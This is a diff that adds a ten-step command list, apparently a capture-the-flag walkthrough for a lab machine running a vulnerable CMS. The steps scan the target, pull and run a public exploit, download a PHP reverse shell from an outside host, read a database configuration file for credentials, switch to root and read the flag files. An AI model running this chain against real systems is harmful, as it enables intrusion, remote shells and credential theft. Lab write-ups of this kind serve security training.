@@ -1,0 +1,10 @@
+1 - nmap -A -p- 10.10.168.15
+2 - searchsploit -m 50477
+3 - python3 50477.py
+4 - wget http://10.8.94.51:8000/php-reverse-shell.php
+5 - php php-reverse-shell.php
+6 - cat /home/www-data/flag.txt
+7 - cat /var/www/html/fuel/application/config/database.php
+8 - su
+9 - whoami
+10 - cat /root/root.txt
